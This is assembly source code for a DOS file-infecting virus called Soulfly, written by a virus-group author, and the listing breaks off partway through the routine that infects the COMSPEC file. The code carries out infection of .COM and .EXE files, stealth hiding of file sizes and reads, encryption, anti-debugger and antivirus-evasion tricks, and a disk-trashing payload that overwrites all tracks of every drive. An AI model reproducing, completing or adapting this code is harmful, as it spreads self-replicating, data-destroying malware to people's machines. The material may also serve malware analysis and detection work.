   ;============================================================================
   ;
   ;
   ;     NAME: Soulfly v1.00
   ;     TYPE: Full-stealth variable encrypting .COM & .EXE-infector.
   ;     SIZE: 2000 bytes.
   ;       OS: DOS.
   ;      CPU: 286+
   ;   AUTHOR: T-2000 / [Immortal Riot].
   ;   E-MAIL: T2000_@hotmail.com
   ;     DATE: December 1998 - January 1999.
   ;  PAYLOAD: But ofcourse, disktrashing.
   ;
   ;
   ;       - Full-stealth (network/Win95 compatible).
   ;       - Variable encrypted in files (including hostbytes).
   ;       - Disables stealth during execution archivers/disktools.
   ;       - Goes resident in UMB-area if available.
   ;       - Infects files pointed to COMSPEC and WINDIR-variables.
   ;       - Anti-debugger/tracer/disassembler/emulator tricks.
   ;       - Passes sanity-checks.
   ;       - Highly destructive payload, no sector is safe.
   ;
   ;
   ;        "I'LL MAKE YOU BLEED AND YOU'RE BLEEDING NOW!! MUTHAFUCKA!!"
   ;
   ;============================================================================


                   .MODEL  TINY
                   .STACK  Virus_Stack
                   .286
                   .CODE


   Virus_Stack     EQU     1024
   Virus_Size      EQU     (Virus_End - Start)
   Virus_Size_Mem  EQU     ((Virus_End_Mem - Start) + 15) / 16
   Res_Check_AX    EQU     0DB66h
   Res_Check_BX    EQU     83FBh
   Marker_Mem_AX   EQU     1112h
   Marker_Mem_BX   EQU     1EE7h
   Marker_File     EQU     9AEAh
   Century         EQU     100 SHL 1
   Encrypted_Size  EQU     (End_Encrypted - Encrypted)


   START:
                   PUSH    DS                      ; Save PSP of our host.

                   CALL    Get_Delta

   Anti_Disasm:    DB      0EAh

   Get_Delta:      POP     DS                      ; Use a segment-register so
                                                   ; F-Prot won't yell.
                   MOV     SI, DS

                   SUB     SI, (Anti_Disasm - Start)

                   PUSH    CS
                   POP     DS

                   MOV     AX, 0                   ; Initial decryption-key.
   Init_Key        =       WORD PTR $-2

                   MOV     BX, OFFSET End_Encrypted - 2
                   MOV     CX, (Encrypted_Size / 2)

   Decrypt_Word:   XOR     [SI+BX], AX             ; Decrypt a word.

                   DEC     BX                      ; Next (previous) word.
                   DEC     BX

                   ADD     AX, 0                   ; Key-slider, to fuck X-Rays.
   Slide_Key       =       WORD PTR $-2

                   JMP     Loop_Decrypt            ; Reload that prefetch-que!

                   DB      9Ah

   IF (($ - Start) MOD 2) EQ 1
                   DB      -1
   ENDIF

   Loop_Decrypt:   LOOP    Decrypt_Word

   Encrypted:      CALL    Anti_Debugger

                   AND     DI, CX                  ; Zero DI.
                   JZ      Do_Res_Check

                   DB      0EAh

   Do_Res_Check:   MOV     AX, Res_Check_AX        ; Residency-check.
                   MOV     BX, Res_Check_BX
                   INT     21h

                   CMP     AX, Marker_Mem_AX       ; We're already up there?
                   JNE     Make_Virus_TSR

                   CMP     BX, Marker_Mem_BX       ; Double-check.
                   JNE     Make_Virus_TSR

   JMP_Exec_Host:  JMP     Exec_Host

   Make_Virus_TSR: MOV     AX, 5802h               ; Get UMB link state.
                   INT     21h
                   JC      Try_Alloc_Mem

                   CBW                             ; Save link state on stack.
                   PUSH    AX

                   MOV     AX, 5803h               ; Link UMB-chain.
                   PUSH    AX
                   MOV     BX, 01h
                   INT     21h
                   JC      Try_Alloc_Mem

                   INC     CX

                   MOV     AX, 5800h               ; Get allocation strategy.
                   INT     21h
                   JC      Try_Alloc_Mem

                   PUSH    AX                      ; Save strategy on stack.

                   MOV     AX, 5801h               ; Set allocation strategy,
                   PUSH    AX                      ; First fit, start with UMBs.
                   MOV     BL, 80h
                   INT     21h
                   JC      Try_Alloc_Mem

                   INC     CX

   Try_Alloc_Mem:  MOV     AH, 48h                 ; Try to allocate memory...
                   MOV     BX, Virus_Size_Mem
                   INT     21h
                   JNC     Copy_Virus_Up

                   MOV     AH, 4Ah                 ; Get total size of block.
                   MOV     BX, 0FFFFh
                   INT     21h

                   MOV     AH, 4Ah                 ; Resize block, so there's
                   SUB     BX, Virus_Size_Mem + 1  ; room for the virus.
                   INT     21h

                   JMP     Try_Alloc_Mem

   Trash_Text      DB      'SOULFLY, FLY FREE!', 0Ah, 0Dh, '$'

   Copy_Virus_Up:  MOV     ES, AX                  ; Our allocated block.

                   DEC     AX                      ; MCB of allocated block.
                   MOV     DS, AX

                   MOV     [DI.MCB_PSP], 08h       ; Block doesn't have a PSP.
                   MOV     [DI.MCB_Program], 'CS'  ; Used by the system.

                   JCXZ    Do_Copy_Up

                   DEC     CX
                   JZ      Restore_Link

   Restore_Alloc:  POP     AX                      ; Restore original allocation
                   POP     BX                      ; strategy.
                   INT     21h

   Restore_Link:   POP     AX                      ; Restore UMB link state.
                   POP     BX
                   INT     21h

   Do_Copy_Up:     PUSH    SI

                   MOV     CX, (Virus_Size / 2)    ; Copy virus to allocated
                   CLD                             ; segment.
                   SEGCS
                   REP     MOVSW

                   POP     SI

                   PUSH    ES
                   POP     DS

                   MOV     Active_Switch, CX

                   JCXZ    Get_Int13h              ; To confuse some analyzers.

                   DB      9Ah

   Get_Int13h:     MOV     AX, 3513h               ; Get address INT 13h for
                   INT     21h                     ; payload-routine.

                   MOV     Int13h, BX              ; Save it.
                   MOV     Int13h+2, ES

                   MOV     AL, 21h                 ; Get address INT 21h.
                   INT     21h

                   MOV     Int21h, BX              ; Save it.
                   MOV     Int21h+2, ES

                   MOV     AH, 25h                 ; Chain our own handler.
                   MOV     DX, OFFSET NewInt21h
                   INT     21h

                   CALL    Infect_ComSpec

   Exec_Host:      PUSH    CS
                   POP     DS

                   ADD     SI, OFFSET Host_Bytes

                   CALL    Crypt_Header

                   POP     ES                      ; PSP of current process.

                   XOR     AX, AX
                   XOR     BX, BX
                   CWD

                   CALL    Check_4_EXE             ; This host is a .EXE-file?
                   JE      Exec_Host_EXE

   Exec_Host_COM:  MOV     DI, 100h - 1            ; Restore original entry-
                   INC     DI                      ; bytes of our host.
                   PUSH    DI
                   MOV     CL, 24 / 2
                   CLD
                   REP     MOVSW

                   PUSH    ES
                   POP     DS

                   XOR     SI, SI
                   XOR     DI, DI

                   RETN

   Exec_Host_EXE:  MOV     CX, ES                  ; Calculate effective
                   ADD     CX, 10h                 ; segment.

                   ADD     [SI.Program_CS], CX

                   ADD     CX, [SI.Program_SS]

                   PUSH    ES
                   POP     DS

                   MOV     SS, CX
                   MOV     SP, CS:[SI.Program_SP]

                   XOR     CX, CX
                   XOR     DI, DI

                   JMP     DWORD PTR CS:[SI.Program_IP]


   Anti_Debugger:
                   POP     DI                      ; POP return-address.

                   CMP     BYTE PTR CS:[DI], 0CCh  ; Debugger breakpoint?
                   JE      Payload

                   CLI                             ; Stack-checker, to detect
                   PUSH    AX                      ; debuggers and single-step
                   POP     AX                      ; tracers such as TBClean.
                   DEC     SP
                   DEC     SP
                   POP     BX
                   STI

                   CMP     AX, BX                  ; They're the same?
                   JNE     Payload                 ; Else fuck him over.

                   JMP     DI


   ; NO HOPE = NO FEAR
   Payload:
                   PUSH    CS
                   POP     DS

                   PUSH    CS
                   POP     ES

                   MOV     BX, OFFSET Trash_Text
                   MOV     CX, 01h
                   MOV     DX, 80h

   Trash_Loop:     XOR     AH, AH                  ; Reset drive.
                   CALL    OldInt13h

                   MOV     AX, 033Fh               ; Trash track with garbage.
                   CALL    OldInt13h

                   ADD     CH, CL                  ; Take all tracks.
                   ADC     DH, 0                   ; Take all heads.
                   ADC     DL, 0                   ; Take all drives.

                   PUSH    DX

                   MOV     AH, 09h                 ; Let them know what hit 'em.
                   MOV     DX, OFFSET Trash_Text
                   CALL    OldInt21h

                   POP     DX

                   JMP     Trash_Loop


   IRC_Hint        DB      '<Soulfly->', 0


   NewInt21h:
                   JMP     $+666h
   Active_Switch   =       WORD PTR $-2

   Chk_Stealth_F:  CMP     AH, 11h - 1             ; Findfirst (FCB) ?
                   JBE     Chk_Stealth_H

                   CMP     AH, 12h                 ; Findnext (FCB) ?
                   JA      Chk_Stealth_H

   Stealth_Size_F: CALL    OldInt21h

                   PUSHF
                   PUSHA
                   PUSH    DS
                   PUSH    ES

                   OR      AL, AL                  ; Abort if error.
                   JNZ     JMP_RETF2_Exit

                   CALL    Get_DTA

                   CMP     DS:[BX.FCB_Drive], -1   ; Test for an extended FCB.
                   JNE     FCB_Format_OK

                   ADD     BX, 07h                 ; Coz we don't need it.

   FCB_Format_OK:  CMP     BYTE PTR DS:[BX.FCB_Date+1], AL
                   JB      RETF2_Exit

                   SUB     BYTE PTR DS:[BX.FCB_Date+1], AL

                   SUB     DS:[BX.FCB_Size], Virus_Size
                   SBB     DS:[BX.FCB_Size+2], DX

   JMP_RETF2_Exit: JMP     RETF2_Exit

   Chk_Stealth_H:  CMP     AH, 4Eh                 ; Findfirst (handle) ?
                   JB      Chk_Stealth_W

                   CMP     AH, 4Fh                 ; Findnext (handle) ?
                   JA      Chk_Stealth_W

   Stealth_Size_H: CALL    OldInt21h               ; Execute the function.

                   PUSHF
                   PUSHA
                   PUSH    DS
                   PUSH    ES
                   JC      RETF2_Exit

                   CALL    Get_DTA

                   CMP     BYTE PTR DS:[BX.Handle_Date+1], AL
                   JB      RETF2_Exit

                   SUB     BYTE PTR DS:[BX.Handle_Date+1], AL

                   SUB     DS:[BX.Handle_Size], Virus_Size
                   SBB     DS:[BX.Handle_Size+2], DX

                   JMP     RETF2_Exit

   Chk_Stealth_W:  CMP     AX, 714Eh               ; Findfirst (Win95) ?
                   JB      Chk_Stealth_Re

                   CMP     AX, 714Fh               ; Findnext (Win95) ?
                   JA      Chk_Stealth_Re

                   .386                            ; This routine will only be
                                                   ; called in Win95, which is
                                                   ; 386+.
   Stealth_Size_W: CALL    OldInt21h

                   PUSHF
                   PUSHA
                   PUSH    DS
                   PUSH    ES
                   JC      RETF2_Exit

                   PUSH    ES
                   POP     DS

                   MOV     DH, BYTE PTR DS:[DI.Win95_Date+1]

                   DEC     SI                      ; Stamp is in DOS-format?
                   JZ      Is_DOS_Format

                   PUSH    SI

                   MOV     AX, 71A7h               ; Convert Win95-format to
                   XOR     BL, BL                  ; DOS-format.
                   LEA     SI, DS:[DI.Win95_Time]
                   CALL    OldInt21h

                   POP     SI

   Is_DOS_Format:  CMP     DH, Century             ; This file is infected?
                   JB      RETF2_Exit

                   ; Restore original filesize.

                   SUB     DS:[DI.Win95_Size_Lo], LARGE Virus_Size
                   SBB     DS:[DI.Win95_Size_Hi], 0

                   INC     SI
                   JZ      RETF2_Exit

                   SUB     BYTE PTR DS:[DI.Win95_Date+1], Century

   RETF2_Exit:     POP     ES
                   POP     DS
                   POPA
                   POPF

                   RETF    2

                   .286                            ; Back to 80286-mode.

   Chk_Stealth_Re: CMP     AH, 3Fh                 ; Read file?
                   JE      Stealth_Read

                   JMP     Chk_Seek_EOF

   Stealth_Read:   PUSHF
                   PUSHA
                   PUSH    DS
                   PUSH    ES

                   MOV     CS:Bytes_To_Read, CX
                   MOV     CS:Read_Buffer, DX

                   CALL    Check_Handle
                   JS      JMP_Exit_Abort
                   JNB     File_Infected

   JMP_Exit_Abort: JMP     Exit_Abort

   File_Infected:  CALL    Save_File_Pos

                   ADD     AX, 0                   ; Calculate end-position of
   Bytes_To_Read   =       WORD PTR $-2            ; the caller's read.
                   ADC     DX, CX

                   XCHG    SI, AX                  ; Save it in DI:SI.
                   MOV     DI, DX

                   CALL    Go_EOF

                   SUB     AX, Virus_Size          ; Calculate uninfected size.
                   SBB     DX, CX

                   CMP     DI, DX                  ; Read reaches virusbody?
                   JB      Not_In_Body
                   JA      In_Body

                   CMP     SI, AX
                   JNA     Not_In_Body

   In_Body:        PUSH    AX
                   PUSH    DX

                   CALL    Restore_File_Pos

                   POP     DI                      ; Size uninfected.
                   POP     SI

                   SUB     SI, AX                  ; Calculate amount of bytes
                                                   ; to read.
                   MOV     CX, SI

                   JMP     Do_Read

   Not_In_Body:    MOV     CX, CS:Bytes_To_Read

   Do_Read:        PUSHA

                   CALL    Restore_File_Pos

                   POPA

                   MOV     DX, 0                   ; Do the stealthed read.
   Read_Buffer     =       WORD PTR $-2
                   CALL    Read_File

                   JC      RETF2_Exit

                   MOV     [BP.Reg_AX], AX         ; Store amount of bytes read.

                   PUSH    AX

                   CALL    Save_File_Pos

                   PUSH    AX
                   PUSH    DX

                   PUSH    DS
                   POP     ES

                   CALL    Seek_Header

                   CALL    Read_Header

                   CALL    Crypt_Header

                   POP     DX                      ; Position after read.
                   POP     AX

                   POP     CX

                   SUB     AX, CX                  ; Pos readstart
                   SBB     DX, 0

                   JNZ     Exit_St_Read            ; They read from the header?

                   CMP     AX, 24
                   JNB     Exit_St_Read

                   ADD     CX, AX                  ; Calculate end-offset read.
                   JC      Header_End

                   CMP     CX, 24
                   JNA     Read_St_Header

   Header_End:     MOV     CX, 24

   Read_St_Header: SUB     CX, AX                  ; Calculate amount of bytes
                                                   ; to stealth from header.
                   ADD     SI, AX

                   MOV     DI, Read_Buffer

                   CLD                             ; Copy the clean header into
                   REP     MOVSB                   ; the caller's buffer.

   Exit_St_Read:   CALL    Restore_File_Pos

   JMP_RETF2_E:    JMP     RETF2_Exit

   Restore_Abort:  CALL    Restore_File_Pos

   Exit_Abort:     POP     ES
                   POP     DS
                   POPA
                   POPF

   Chk_Seek_EOF:   CMP     AX, 4202h               ; Seek to EOF ?
                   JNE     Chk_Stealth_Wr

   Stealth_Seek:   CALL    OldInt21h

                   PUSHF
                   PUSHA
                   PUSH    DS
                   PUSH    ES
                   JC      Exit_S_Seek

                   CALL    Check_Handle
                   JS      Exit_S_Seek
                   JB      Exit_S_Seek

                   MOV     AX, 4201h
                   MOV     CX, -1
                   MOV     DX, -Virus_Size
                   CALL    OldInt21h

                   MOV     [BP.Reg_AX], AX
                   MOV     [BP.Reg_DX], DX

   Exit_S_Seek:    JMP     JMP_RETF2_E

   Chk_Stealth_Wr: CMP     AH, 40h                 ; Write file?
                   JNE     Chk_Debugger

   Stealth_Write:  CALL    Check_Clean

   Chk_Debugger:   CMP     AX, 4B01h
                   JNE     Chk_Stealth_St

   Clean_File:     PUSHA

                   MOV     AX, 3D92h
                   CALL    OldInt21h
                   JC      Exit_Clean_F

                   XCHG    BX, AX

                   CALL    Check_Clean

                   MOV     AH, 3Eh
                   CALL    OldInt21h

   Exit_Clean_F:   POPA

   Chk_Stealth_St: CMP     AX, 5700h               ; Get filedate & time?
                   JNE     Chk_Disk_Tool

   Stealth_Stamp:  CALL    OldInt21h

                   PUSHF
                   JC      Exit_Get_Stamp

                   CMP     DH, Century
                   JB      Exit_Get_Stamp

                   SUB     DH, Century

   Exit_Get_Stamp: POPF

                   RETF    2


   Chk_Disk_Tool:  CMP     AH, 1Fh                 ; Get default DPB ?
                   JE      Set_Inactive

                   CMP     AH, 32h                 ; Get DPB ?
                   JNE     Check_4_Exec

   Set_Inactive:   MOV     CS:Active_Switch, (Inactive - Active_Switch) - 2

                   JMP     Check_4_Exec

                   DB      9Ah

   Check_4_Exec:   CMP     AX, 4B00h               ; Program execute?
                   JE      Init_Execute

                   CMP     AH, 3Dh                 ; Open file?
                   JE      Check_Infect

                   CMP     AX, 6C00h               ; Extended open?
                   JE      Check_Infect

                   CMP     AH, 41h                 ; Delete file?
                   JE      Check_Infect

   Inactive:       CMP     AH, 4Ch                 ; Program terminate (PSP) ?
                   JE      Enable_Stealth

                   CMP     AH, 31h                 ; Terminate & stay resident?
                   JE      Enable_Stealth

                   OR      AH, AH                  ; Program terminate (CS) ?
                   JNZ     Check_4_Res

   Enable_Stealth: AND     CS:Active_Switch, 0

   Check_4_Res:    CMP     AX, Res_Check_AX
                   JNE     JMP_Int21h

                   CMP     BX, Res_Check_BX
                   JE      Return_Marker

   JMP_Int21h:     DB      0EAh                    ; JMP FAR opcode.
   Int21h          DW      0, 0


   ; Check if the call was made by the virus, if not, call the payload.
   Return_Marker:
                   PUSHA
                   PUSH    ES

                   PUSH    CS
                   POP     ES

                   MOV     DI, OFFSET Encrypted
                   ADD     SI, DI
                   MOV     CX, (Exec_Host - Encrypted)
                   CLD
                   REPE    CMPSB

                   POP     ES
                   POPA

                   JE      Caller_Is_OK

                   JMP     Payload

   Caller_Is_OK:   MOV     AX, Marker_Mem_AX
                   MOV     BX, Marker_Mem_BX

                   IRET


   Init_Execute:
                   PUSHA
                   PUSH    DS
                   PUSH    ES

                   MOV     AH, 2Ah                 ; Get system-date.
                   CALL    OldInt21h

                   CMP     DL, 31                  ; 31st of any month?
                   JB      No_Activate

                   MOV     AH, 2Ch                 ; Get system-time.
                   CALL    OldInt21h

                   OR      CL, CL                  ; We're in the first minute?
                   JNZ     No_Activate

                   JMP     Payload

   No_Activate:    MOV     SI, OFFSET Archivers    ; A known archiver is about
                   CALL    Scan_Line               ; to get executed?
                   JNE     Exit_Init_Exec

           ; === Then temporarily disable stealth & infection. ===

                   MOV     CS:Active_Switch, (Inactive - Active_Switch) - 1

   Exit_Init_Exec: POP     ES
                   POP     DS
                   POPA

   Check_Infect:   PUSHA
                   PUSH    DS
                   PUSH    ES

                   CALL    Anti_Debugger

                   CALL    Hook_Int24h

                   CMP     AX, 6C00h               ; Extended open?
                   JNE     Check_Ext

                   MOV     DX, SI                  ; Then adjust register.

   Check_Ext:      MOV     SI, DX

   Find_End_Str:   CLD                             ; Find end of ASCIIZ-string.
                   LODSB

                   OR      AL, AL
                   JNZ     Find_End_Str

                   MOV     AX, [SI-2]
                   CALL    Make_Uppercase

                   XCHG    BX, AX

                   MOV     AX, [SI-4]
                   CALL    Make_Uppercase

   Check_Ext_COM:  CMP     AX, 'OC'                ; .COM-extension?
                   JNE     Check_Ext_EXE

                   CMP     BL, 'M'
                   JE      Save_File_Attr

   Check_Ext_EXE:  CMP     AX, 'XE'                ; .EXE-extension?
                   JNE     JMP_Exit_Inf

                   CMP     BL, AL
                   JE      Save_File_Attr

   JMP_Exit_Inf:   JMP     Exit_Infect

   Save_File_Attr: MOV     CS:File_Name, DX        ; Save filename.
                   MOV     CS:File_Name+2, DS

                   MOV     AX, 4300h               ; Get file-attributes.
                   PUSH    AX
                   CALL    OldInt21h
                   POP     AX
                   JC      JMP_Exit_Inf

                   MOV     CS:File_Attr, CX        ; Save 'em.

                   INC     AX                      ; Remove readonly-flag.
                   AND     CL, NOT 00000001b
                   CALL    OldInt21h
                   JC      JMP_Exit_Inf

   Open_Candidate: MOV     AX, 3D92h               ; Open the candidate-file.
                   CALL    OldInt21h
                   JNC     File_Opened

                   JMP     Restore_Attr

   File_Opened:    XCHG    BX, AX

                   CALL    Check_Handle
                   JS      Abort_Infect
                   JNB     Abort_Infect

                   PUSH    CS
                   POP     ES

                   CALL    Read_Header
                   JC      Abort_Infect

                   CMP     [SI.Checksum], Marker_File
                   JE      Abort_Infect

   Check_Min_Size: CALL    Go_EOF

                   OR      DX, DX
                   JNZ     Not_Too_Small

                   CMP     AX, 560
                   JB      Abort_Infect

   Not_Too_Small:  CALL    Check_4_EXE
                   JE      Chk_4_Overlay

   Check_COM:      OR      DX, DX
                   JNZ     Abort_Infect

                   CMP     AX, (65535 - (Virus_Size + 1024))
                   JB      Chk_4_Inf_Date

                   JMP     Abort_Infect

   Chk_4_Overlay:  CALL    Div_512_Pages

                   CMP     AX, [SI.Image_512_Pages]
                   JNE     Abort_Infect

                   CMP     DX, [SI.Image_Mod_512]
                   JNE     Abort_Infect

   Check_4_NE_PE:  CMP     [SI.Reloc_Table], 40h   ; It's a possible NE/PE-file?
                   JB      Chk_4_Inf_Date

                   MOV     AX, 4200h               ; Seek to the NE/PE-header.
                   MOV     CX, [SI+3Ch+2]
                   MOV     DX, [SI+3Ch]
                   CALL    OldInt21h

                   MOV     CX, 2
                   LEA     DX, [SI+3Ch]
                   CALL    Read_File

                   CMP     [SI+3Ch], 'EN'          ; Avoid NE-files.
                   JE      Abort_Infect

                   CMP     [SI+3Ch], 'EP'          ; Avoid PE-files.
                   JE      Abort_Infect

   Chk_4_Inf_Date: CALL    Save_File_Stamp
                   JB      Infect_File

   Abort_Infect:   JMP     Close_File_Inf

   Infect_File:    PUSH    SI

                   MOV     DI, OFFSET Host_Bytes
                   PUSH    DI
                   MOV     CX, 24 / 2
                   CLD
                   REP     MOVSW

                   POP     SI

                   IN      AX, 40h
                   MOV     [SI.Header_Key], AX

                   IN      AX, 40h
                   MOV     [SI.Header_Slider], AX

                   CALL    Crypt_Header

                   IN      AX, 40h
                   MOV     Slide_Key, AX

                   XCHG    DX, AX

                   IN      AX, 40h
                   MOV     Init_Key, AX

                   XOR     SI, SI
                   MOV     DI, OFFSET Buffer
                   PUSH    DI
                   MOV     CX, Virus_Size
                   PUSH    CX
                   CLD
                   REP     MOVSB

                   MOV     SI, OFFSET Buffer + ((End_Encrypted - Start) - 2)

                   MOV     CX, (Encrypted_Size / 2)

   Encrypt_Word:   XOR     [SI], AX
                   ADD     AX, DX

                   DEC     SI
                   DEC     SI

                   LOOP    Encrypt_Word

                   CALL    Go_EOF

                   XCHG    BP, AX
                   MOV     DI, DX

                   POP     CX
                   POP     DX
                   CALL    Write_File

                   POP     SI

                   JC      Close_File_Inf

                   CALL    Check_4_EXE             ; We're infecting an .EXE ?
                   JE      Infect_EXE

   Infect_COM:     SUB     BP, 3                   ; Calculate JMP-displacement.

                   MOV     [SI.Jump], 0E9h         ; JMP opcode.
                   MOV     [SI.Displacement], BP   ; Pointing to the viruscode.

                   JMP     Set_Header

   Infect_EXE:     PUSH    BP
                   PUSH    DI

                   MOV     AX, [SI.Header_Size_Mem]
                   MOV     CX, 16
                   MUL     CX

                   XCHG    BP, AX                  ; Headersize in bytes.
                   MOV     DI, DX

                   POP     DX
                   POP     AX

                   SUB     AX, BP                  ; Calculate size of image.
                   SBB     DX, DI

                   MOV     CL, 16                  ; Calculate new CS:IP.
                   DIV     CX

                   MOV     [SI.Program_CS], AX
                   MOV     [SI.Program_IP], DX

                   ADD     AX, ((Virus_Size + 15) / 16)

                   MOV     [SI.Program_SS], AX
                   MOV     [SI.Program_SP], Virus_Stack

                   CALL    Div_512_Pages

                   MOV     [SI.Image_512_Pages], AX
                   MOV     [SI.Image_Mod_512], DX

                   ADD     [SI.Min_Size_Mem], Virus_Size_Mem + (Virus_Stack / 16)

                   ADD     [SI.Max_Size_Mem], Virus_Size_Mem + (Virus_Stack / 16)
                   JNC     Set_Header

                   SUB     [SI.Max_Size_Mem], Virus_Size_Mem + (Virus_Stack / 16)

   Set_Header:     MOV     [SI.Checksum], Marker_File

                   CALL    Write_Header

                   ADD     BYTE PTR File_Date+1, Century

                   CALL    Restore_File_Stamp

   Close_File_Inf: MOV     AH, 3Eh                 ; Close file.
                   CALL    OldInt21h

   Restore_Attr:   MOV     AX, 4301h - 1           ; Restore original file-
                   INC     AX                      ; attributes.
                   MOV     CX, 0
   File_Attr       =       WORD PTR $-2
                   LDS     DX, DWORD PTR CS:File_Name
                   CALL    OldInt21h

   Exit_Infect:    CALL    Unhook_Int24h

                   POP     ES
                   POP     DS
                   POPA

                   JMP     JMP_Int21h


   OldInt13h:
                   PUSHF
                   DB      9Ah
   Int13h          DW      0, 0

                   RETN


   Div_512_Pages:
                   CALL    Go_EOF

                   MOV     CH, 512 SHR 8           ; Divide in 512-byte pages.
                   DIV     CX

                   OR      DX, DX                  ; No rest?
                   JZ      Exit_Div_512

                   INC     AX                      ; Else round to next 512.

   Exit_Div_512:   RETN


   Author          DB      'T-2000 / Immortal Riot', 0


   Save_File_Stamp:

                   MOV     AX, 5700h
                   CALL    OldInt21h

                   MOV     CS:File_Time, CX
                   MOV     CS:File_Date, DX

                   CMP     DH, Century

                   RETN


   Restore_File_Stamp:

                   MOV     AX, 5701h
                   MOV     CX, 0
   File_Time       =       WORD PTR $-2
                   MOV     DX, 0
   File_Date       =       WORD PTR $-2
                   JMP     OldInt21h


   Go_BOF:
                   MOV     AX, 4200h
                   JMP     Set_Pos


   Go_EOF:
                   MOV     AX, 4202h
   Set_Pos:        XOR     CX, CX
                   CWD

   OldInt21h:      PUSHF
                   CALL    DWORD PTR CS:Int21h

                   RETN


   ; DS:DX = line.
   ; CS:SI = table.
   Scan_Line:
                   PUSHA

                   PUSH    CS
                   POP     ES

                   PUSH    SI

                   MOV     SI, DX

   Find_End_Line:  CLD
                   LODSB

                   OR      AL, AL
                   JNZ     Find_End_Line

                   DEC     SI

                   MOV     CX, SI

   Find_Filename:  STD
                   LODSB

                   CMP     AL, '\'
                   JE      Found_Filename

                   LOOP    Find_Filename

                   JMP     Adjust_DI

   Found_Filename: INC     SI
                   INC     SI

                   CMP     SI, DX                  ; No path was supplied?
                   JA      Offset_OK

   Adjust_DI:      MOV     SI, DX                  ; Then adjust DI.

   Offset_OK:      MOV     DI, OFFSET Filename_Buffer
                   MOV     CX, 12

                   PUSH    DI

                   CLD

   Conv_Filename:  LODSB

                   CALL    Make_Uppercase

                   STOSB

                   LOOP    Conv_Filename

                   POP     DI
                   POP     SI

   Comp_Filename:  SEGCS
                   LODSB

                   CBW
                   XCHG    CX, AX

                   CMP     CX, DI                  ; NZ

                   JCXZ    Exit_Scan_Line

                   PUSHA

                   SEGCS
                   REPE    CMPSB

                   POPA

                   PUSHF

                   ADD     SI, CX

                   POPF

                   JE      Exit_Scan_Line

                   JMP     Comp_Filename

   Exit_Scan_Line: POPA

                   CLD

                   RETN



   ; DS:SI = Header.
   Crypt_Header:
                   PUSHA
                   PUSH    ES

                   PUSH    CS
                   POP     ES

                   MOV     DI, SI

                   MOV     BX, [SI.Header_Key]
                   MOV     DX, [SI.Header_Slider]

                   MOV     CL, (24 / 2)

   Copy_Crypt_W:   CLD
                   LODSW

                   XOR     AX, BX

                   ROR     BX, CL

                   ADD     BX, DX

                   STOSW

                   LOOP    Copy_Crypt_W

                   LODSW
                   STOSW

                   LODSW
                   STOSW

                   POP     ES
                   POPA

                   RETN


   Archivers       DB      09, 'PKZIP.EXE'
                   DB      07, 'ARJ.EXE'
                   DB      07, 'LHA.EXE'
                   DB      07, 'RAR.EXE'
                   DB      10, 'BACKUP.EXE'
                   DB      07, 'FTP.EXE'
                   DB      0


   Get_DTA:
                   MOV     AX, 2F00h + Century
                   CALL    OldInt21h

                   PUSH    ES
                   POP     DS

                   CWD                             ; Zero DX.

                   RETN



   Check_Clean:
                   PUSHF
                   PUSHA
                   PUSH    DS
                   PUSH    ES

                   CALL    Hook_Int24h

                   CALL    Check_Handle
                   JS      Exit_Clean_H
                   JB      Exit_Clean_H

                   CALL    Save_File_Pos

                   CALL    Seek_Header

                   CALL    Read_Header

                   CALL    Crypt_Header

                   CALL    Write_Header

                   MOV     AX, 4202h
                   MOV     CX, -1
                   MOV     DX, -Virus_Size
                   CALL    OldInt21h

                   INC     CX                      ; Cut-off virusbody.
                   CALL    Write_File

                   CALL    Restore_File_Pos

                   SUB     BYTE PTR File_Date+1, Century

                   CALL    Restore_File_Stamp

   Exit_Clean_H:   CALL    Unhook_Int24h

                   POP     ES
                   POP     DS
                   POPA
                   POPF

                   RETN


   Hook_Int24h:
                   PUSHA
                   PUSH    DS

                   PUSH    CS
                   POP     DS

                   MOV     AX, 3524h
                   CALL    OldInt21h

                   MOV     Int24h, BX
                   MOV     Int24h+2, ES

                   MOV     AH, 25h
                   MOV     DX, OFFSET NewInt24h
                   CALL    OldInt21h

                   POP     DS
                   POPA

                   RETN


   Unhook_Int24h:
                   MOV     AX, 2524h
                   LDS     DX, DWORD PTR CS:Int24h
                   JMP     OldInt21h


   NewInt24h:
                   MOV     AL, 03h

                   IRET


   Save_File_Pos:
                   MOV     AX, 4201h
                   XOR     CX, CX
                   CWD
                   CALL    OldInt21h

                   MOV     CS:File_Pos_Lo, AX
                   MOV     CS:File_Pos_Hi, DX

                   RETN


   Restore_File_Pos:

                   MOV     AX, 4200h
                   MOV     CX, 0
   File_Pos_Hi     =       WORD PTR $-2
                   MOV     DX, 0
   File_Pos_Lo     =       WORD PTR $-2
                   JMP     OldInt21h


   Seek_Header:
                   MOV     AX, 4202h
                   DEC     CX
                   MOV     DX, -28
                   JMP     OldInt21h


   Read_Header:
                   PUSH    CS
                   POP     DS

                   MOV     SI, OFFSET Header

                   MOV     CX, 40h
                   MOV     DX, SI
                   CALL    Read_File
                   JC      Exit_Read_Hdr

                   CMP     AX, CX

   Exit_Read_Hdr:  RETN


   Read_File:
                   MOV     AH, 3Fh
                   JMP     OldInt21h


   Write_Header:
                   CALL    Go_BOF

                   MOV     CL, 24                  ; Write updated header.
                   MOV     DX, SI

   Write_File:     MOV     AH, 40h
                   JMP     OldInt21h



   ; Converts characters in AX to uppercase.
   Make_Uppercase:
                   CMP     AL, 'a'
                   JB      Check_Upper_AH

                   CMP     AL, 'z'
                   JA      Check_Upper_AH

                   SUB     AL, 'a' - 'A'

   Check_Upper_AH: CMP     AH, 'a'
                   JB      Exit_Uppercase

                   CMP     AH, 'z'
                   JA      Exit_Uppercase

                   SUB     AH, 'a' - 'A'

   Exit_Uppercase: RETN



   Check_Handle:
                   XOR     SI, SI

                   MOV     AX, 4400h
                   CALL    OldInt21h

                   OR      DL, DL
                   JS      Exit_Chk_File

                   CALL    Save_File_Stamp

                   MOV     BP, SP

                   INC     BP
                   INC     BP

                   INC     SI

   Exit_Chk_File:  RETN


   Infect_ComSpec:
                   PUSHA

                   PUSH    DS
                   POP     ES

                   MOV     AH, 62h                 ; Get current PSP.
                   INT     21h

                   XOR     SI, SI

                   MOV     DS, BX
                   MOV     DS, DS:[SI+2Ch]

   Comp_Env_Var:   CMP     DS:[SI], CL             ; End of settings reached?
                   JZ      Exit_Inf_ComSpec

                   MOV     AX, DS:[SI+5]
                   CALL    Make_Uppercase

                   XCHG    BX, AX

                   MOV     AX, DS:[SI]
                   CALL    Make_Uppercase

                   CMP     AX, 'OC'                ; Look for 'COMSPEC='.
                   JNE     Test_4_Win_Dir

                   CMP     BX, 'CE'
                   JNE     Test_4_Win_Dir

